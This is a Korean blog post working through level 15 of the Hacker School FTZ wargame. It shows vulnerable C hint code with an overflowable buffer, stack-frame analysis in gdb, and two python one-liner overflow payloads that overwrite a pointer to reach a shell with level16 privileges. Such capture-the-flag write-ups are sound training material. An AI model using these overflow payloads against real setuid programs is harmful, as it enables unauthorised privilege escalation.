---
layout: post
title: "Hacker School FTZ - Level 15"
description: "Do you know the pointer?"
comments: true
categories: [FTZ]
tags: [FTZ]
---

<img data-action="zoom" src='{{ "assets/ftz/level15/1.jpg" | relative_url }}' alt='relative'>  

## 1) level15/ guess what입력해 로그인  
 
``` c
#include <stdio.h>

main()
{ int crap;
  int *check;
  char buf[20];
  fgets(buf,45,stdin);
  if (*check==0xdeadbeef)
   {
     setreuid(3096,3096);
     system("/bin/sh");
   }
}
```

<img data-action="zoom" src='{{ "assets/ftz/level15/2.png" | relative_url }}' alt='relative'>  

이제 힌트로 준 코드만 봐도 스택이 어떻게 구성되어 있을지 감이 옵니다.  
14번과 거의 동일하지만 15번에서는 check 변수가 포인터로 되어 있습니다.  

## 2) 그래도 스택 프레임 구조는 살펴보자  

<img data-action="zoom" src='{{ "assets/ftz/level15/3.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/ftz/level15/4.png" | relative_url }}' alt='relative'>  

14번 문제에서는 &\[ebp-16\]에 0xdeadbeef가 저장되어 있어야 했지만,  
15번 문제에서는 &\[ebp-16\]에 0xdeadbeef가 저장되어 있는 주소가 저장되어 있어야 한다.  

## 3) 코드에 0xdeadbeef가 상수로 저장되어 있네?  

이 문제를 풀기 위해 입력값이 0xdeadbeef를 입력할 필요가 없습니다.  
왜냐하면 코드에 이미 쓰여있기 때문입니다.  

<img data-action="zoom" src='{{ "assets/ftz/level15/5.png" | relative_url }}' alt='relative'>  

0xdeadbeef가 적혀있는 코드 주변을 살펴보니 0x080483e4 주소에 0xdeadbeef가 저장되어 있습니다.  

이 주소를 가지고 ./atm 프로그램에서 bof를 일으켜보겠습니다.  

``` bash
(python -c 'print "\x90"*40+"\xe4\x83\x04\x08"'; cat) | ./attackme
```

<img data-action="zoom" src='{{ "assets/ftz/level15/6.png" | relative_url }}' alt='relative'>  

shell이 실행되는 것을 확인할 수 있습니다.  

이 방법을 attackme 프로그램에도 적용해보겠습니다.  

## 4) attackme 프로그램에서 0xdeadbeef이 저장된 주소 찾아 bof 일으키고 level16 권한으로 shell 따기  

<img data-action="zoom" src='{{ "assets/ftz/level15/7.png" | relative_url }}' alt='relative'>  

attackme 프로그램도 gdb로 분석해 0xdeadbeef가 저장된 주소를 찾았습니다.  

``` bash
(python -c 'print "\x90"*40+"\xb2\x84\x04\x08"'; cat) | ./attackme
```

<img data-action="zoom" src='{{ "assets/ftz/level15/8.png" | relative_url }}' alt='relative'>  

attackme 프로그램을 분석하여 찾은 0xdeadbeef가 저장된 주소를  
입력 문자열에 넣어 실행한 결과 level16 권한으로 shell을 실행해 level16의 비밀번호를 획득할 수 있었습니다.    